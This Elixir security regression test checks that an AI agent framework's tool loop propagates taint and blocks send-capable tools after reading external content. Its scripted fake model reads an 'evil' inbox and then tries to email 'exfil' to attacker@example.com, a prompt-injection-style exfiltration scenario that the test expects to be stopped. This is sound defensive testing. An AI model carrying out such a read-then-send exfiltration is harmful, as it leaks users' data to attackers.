defmodule Arbor.AI.GenerateTextWithToolsTaintSecurityRegressionTest do
  @moduledoc """
  Security regression (Exposure Check AH / Log-To-Leak, 2026-10-29):

  `Arbor.AI.generate_text_with_tools/2` set no `tool_taint` and allowed
  unlabeled calls, so ToolLoop treated the run as clean. Taint must be
  propagated (or a conservative untrusted label applied). Untainted calls
  are no longer the default; `:allow_untainted` / config is the opt-out.
  """
  use ExUnit.Case, async: false

  alias Arbor.Contracts.Security.Taint
  alias Arbor.LLM.{Client, ContentPart, Request, Response}
  alias Arbor.LLM.TestSupport.SensitivityFixture

  @moduletag :fast
  @moduletag :security_regression

  defmodule Adapter do
    @behaviour Arbor.LLM.ProviderAdapter

    def provider, do: "ai_generate_tools_taint_test"

    def complete(%Request{} = request, _opts) do
      case Enum.count(request.messages, &(&1.role == :tool)) do
        0 ->
          {:ok,
           %Response{
             text: "",
             finish_reason: :tool_calls,
             content_parts: [
               ContentPart.tool_call("c1", "mcp.evil.read_inbox", %{"box" => "in"})
             ],
             raw: %{}
           }}

        1 ->
          {:ok,
           %Response{
             text: "",
             finish_reason: :tool_calls,
             content_parts: [
               ContentPart.tool_call("c2", "comms_send_message", %{
                 "channel" => "email",
                 "to" => "attacker@example.com",
                 "message" => "exfil"
               })
             ],
             raw: %{}
           }}

        _ ->
          {:ok, %Response{text: "done", finish_reason: :stop, raw: %{}}}
      end
    end
  end

  defmodule RecordingExecutor do
    def execute(name, args, workdir, opts) do
      send(self(), {:tool_execution, name, args, workdir, opts})
      {:ok, "external inbox payload"}
    end
  end

  @tools [
    %{
      "type" => "function",
      "function" => %{
        "name" => "mcp.evil.read_inbox",
        "parameters" => %{"type" => "object", "properties" => %{}}
      }
    },
    %{
      "type" => "function",
      "function" => %{
        "name" => "comms_send_message",
        "parameters" => %{"type" => "object", "properties" => %{}}
      }
    }
  ]

  setup do
    SensitivityFixture.setup([Adapter])
    previous_client = :persistent_term.get({Client, :default_client}, :none)

    client =
      Client.new(default_provider: Adapter.provider())
      |> Client.register_adapter(Adapter)

    Client.set_default_client(client)

    previous_gate = Application.get_env(:arbor_llm, :strict_taint_send_gate)
    Application.put_env(:arbor_llm, :strict_taint_send_gate, true)

    on_exit(fn ->
      case previous_client do
        :none -> Client.clear_default_client()
        client -> Client.set_default_client(client)
      end

      if is_nil(previous_gate),
        do: Application.delete_env(:arbor_llm, :strict_taint_send_gate),
        else: Application.put_env(:arbor_llm, :strict_taint_send_gate, previous_gate)
    end)

    :ok
  end

  test "security regression: generate_text_with_tools propagates taint and gates send after an external result" do
    taint = %Taint{
      level: :trusted,
      sensitivity: :internal,
      sanitizations: 0,
      confidence: :verified,
      source: "eval",
      chain: []
    }

    assert {:ok, _result} =
             Arbor.AI.generate_text_with_tools("read then send",
               provider: Adapter.provider(),
               model: "test",
               tools: @tools,
               tool_executor: RecordingExecutor,
               taint: taint,
               max_turns: 4
             )

    assert_receive {:tool_execution, "mcp.evil.read_inbox", _args, _workdir, _opts}

    refute_received {:tool_execution, "comms_send_message", _, _, _},
                    "generate_text_with_tools must propagate taint so send-capable tools are gated"
  end

  test "security regression: an untainted generate_text_with_tools call is not treated as clean" do
    assert {:ok, _result} =
             Arbor.AI.generate_text_with_tools("read then send",
               provider: Adapter.provider(),
               model: "test",
               tools: @tools,
               tool_executor: RecordingExecutor,
               max_turns: 4
             )

    assert_receive {:tool_execution, "mcp.evil.read_inbox", _args, _workdir, exec_opts}
    assert %Taint{level: level} = Keyword.get(exec_opts, :taint)
    assert level in [:untrusted, :hostile]

    refute_received {:tool_execution, "comms_send_message", _, _, _}
  end
end
